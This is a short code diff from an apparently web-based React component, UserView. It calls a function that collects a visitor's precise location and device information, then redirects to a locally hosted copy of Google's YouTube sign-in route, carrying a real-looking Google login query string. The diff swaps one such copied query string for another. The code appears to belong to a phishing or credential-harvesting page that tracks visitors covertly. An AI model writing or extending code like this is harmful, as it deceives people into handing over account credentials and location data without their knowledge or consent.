@@ -30,7 +30,7 @@ export default function UserView() {
         const ok = await collectPreciseLocation(sessionId);
         
         router.push(
-          "/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Dm%26hl%3Did%26next%3D%252F&dsh=S-2113134954%3A1759805731064769&hl=id&ifkv=AfYwgwWbWaIzd7m13Tk1xZYwGRUOL7piKbJ8ITWa5eDWikAJPvKyxZBEUiRUazukk5EItYTiCV7b&passive=true&service=youtube&uilel=3&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+          "?checkedDomains=youtube&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Did%26next%3Dhttps%253A%252F%252Fwww.youtube.com%252F%253FthemeRefresh%253D1&dsh=S1580998053%3A1759823714299971&ec=65620&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=id&ifkv=AfYwgwUZA648uCIe5G1-zVc_KJ9lxDYO9WD3eVpOJtYk8QZHkf5pSY0mtsPp7hO11r0llw5boFYRkA&pstMsg=1&service=youtube"
         );
       } catch (err) {
         console.error("Error collecting device info:", err);
